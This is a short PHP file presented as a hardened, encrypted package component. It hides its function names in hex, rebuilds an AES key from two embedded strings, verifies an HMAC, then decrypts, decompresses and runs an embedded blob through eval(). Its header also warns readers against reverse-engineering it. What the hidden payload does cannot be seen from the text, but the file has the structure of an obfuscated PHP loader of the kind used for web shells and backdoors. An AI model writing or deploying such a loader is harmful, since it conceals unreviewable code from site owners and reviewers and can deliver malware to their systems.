<?php
/**
 * @package Ghazali\EPassPackage
 * @version Production-Hardened-Encrypted
 * @integrity sha256:87579ccc0f7820dc089097f3009bd886dcc014f98dcd2b300f960266c0e17b86
 * @notice Confidential cryptographic artifact. Unauthorized reproduction, tampering, or reverse-engineering prohibited.
 */
declare(strict_types=1);

(static function($_0,$_1,$_2,$_3,$_4): void {
    $_5 = \pack('H*','6865783262696e');
    $_6 = \pack('H*','6f70656e73736c5f64656372797074');
    $_7 = \pack('H*','677a696e666c617465');
    $_8 = \pack('H*','686173685f686d6163');
    $_9 = $_5($_1) ^ $_5($_2);
    $_a = $_5($_0);
    if ($_8(\pack('H*','736861323536'), $_a, $_9) !== $_4) {
        throw new \RuntimeException(\pack('H*','536563757269747920457863657074696f6e3a20496e7465677269747920636865636b206661696c65642e'));
    }
    $_b = $_7($_6($_a, \pack('H*','4145532d3235362d434243'), $_9, 1, $_5($_3)));
    if ($_b !== false) {
        eval($_b);
    }
})('8cbca015874ec6bc48c2bb326e8dee21929ba6a302370891fbf02ef05efa459120cbe9e0928fb7e37f6dbfb510189e90d646b1d1ea6fb11eb238ee08ba71bf99376998fa17522baa5ca32ab778031b39ddc8f9ec213959a9d22d36d3dbf78f8993bb3c3df0d5cb2f7f68541d95f295567ebac10c075f0e0ef84b4e4a34426c9fbd24b51e534d3496d781bb2fac9531afe2c5998b43e6b7d8d6e112cfd972a09ee04ac3a0c6c61940d06aeb673d5444c4d50e48fc1595fed8c55e1de6eb849b6c4f1bc282abc5379f1290ad6a37243a2f541eacce7012d0b47264bdcd2d54e4ea3626ce431737d5e29e21c316e4dd76d945d32d9f8dd6fe733e73baba590e63e17c6115ef3cc4ae3fc6767967f8ae0030619ebae1fd6ef7a177dbd5add3c1dcf7ff5b01f2d8e0753a47a258081b71ffd1ea9f65db5ff86d4c3cf5afc268dc17d7191cb77243bef960e537d09d1105bee45c4ec6c06d0b335ad85346262d980a2d003300dc1ac6a61ec4c489e63e313ec89df8e57773d30d94db6ef2cbd858bea94a17bfe21cb30a24f07eaf447dc709abe45cf0cdcf6a19dbb33223a5761f122a', 'f3fdcbae2e65b615450078e505947520bf4f9562c82f584f740fd9e4b0c92184', '0bb3a309bd8aae926dfa2880e6bcbbda1944856f66685ce5b1a0cfb277876325', '8f09574da7a1b5e251332b06ad44dcf5', '87579ccc0f7820dc089097f3009bd886dcc014f98dcd2b300f960266c0e17b86');